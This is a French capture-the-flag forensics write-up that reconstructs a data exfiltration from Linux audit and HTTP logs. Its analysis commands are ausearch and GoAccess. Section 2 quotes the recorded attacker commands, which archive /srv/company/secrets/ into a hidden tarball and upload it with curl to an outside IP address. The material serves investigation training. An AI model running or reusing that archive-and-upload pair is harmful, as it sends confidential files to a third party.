# Forensic Linux — Reconstituer un transfert à partir des journaux

> **Statut : conclusion documentée dans les notes.** Les journaux originaux ne
> figurent pas dans ce dossier ; les extraits ne sont pas une expertise indépendante.

## Objectif et artefacts

Le challenge demandait d'identifier l'archive transférée et sa destination.
Les fichiers cités sont `disk.img`, `auth.log`, `syslog`, `audit.log` et `access.log`.
Le journal `audit.log` était la principale source pour les exécutions de commandes.

## 1. Examiner les exécutions

Commandes d'analyse conservées :

```bash
ausearch -if files/audit.log
ausearch -if files/audit.log -m EXECVE
```

Les arguments `a0`, `a1`, etc. servent à reconstituer la commande consignée.
L'exécution d'une commande ne prouve pas, à elle seule, le succès du transfert.

## 2. Reconstituer la chronologie

| Heure indiquée | Observation du journal |
| --- | --- |
| 21:14:10 | Création d'une archive à partir de `/srv/company/secrets/` |
| 21:16:40 | Commande de transfert visant cette même archive |

Les commandes ci-dessous sont des **traces historiques, à ne pas exécuter** :

```text
tar czf /tmp/.cache.tgz /srv/company/secrets/
curl -T /tmp/.cache.tgz http://45.77.12.91/upload
```

Le nom d'archive consigné est `.cache.tgz`. La destination mentionnée par la
commande est `45.77.12.91`, sur le chemin `/upload`. L'adresse est un artefact
du récit, pas une cible de test.

## 3. Croiser avec le journal HTTP

Les notes proposaient GoAccess pour lire le journal, notamment s'il utilise
un format Squid :

```bash
goaccess files/access.log --log-format=SQUID -o report.html
```

Le format doit correspondre au fichier étudié. Le journal initial indique
qu'`access.log` servait à confirmer la destination, mais ne conserve pas la ligne
HTTP correspondante. Cette confirmation n'a donc pas été rejouée ici.

## 4. Écarter une piste non pertinente

Un autre événement utilisait `curl -I` vers une adresse différente. Dans les
notes, il s'agissait d'une lecture des en-têtes, pas du transfert de l'archive.
Il ne devait pas être retenu comme preuve du transfert recherché.

## Résultat et limites

Le récit conclut à l'archive et à la destination indiquées ci-dessus.
Flag : `[REDACTED]`.

Les heures sont conservées, mais la date accompagnée d'un jour de semaine dans
le brouillon doit être vérifiée sur les logs originaux. L'état final du transfert
demande également de consulter les événements et réponses complets.

## Méthode à retenir

Identifier la période, reconstituer les arguments des événements `EXECVE`,
rapprocher les outils d'archivage et de transfert, puis croiser avec les journaux
réseau. Séparer une intention de transfert d'un transfert confirmé.
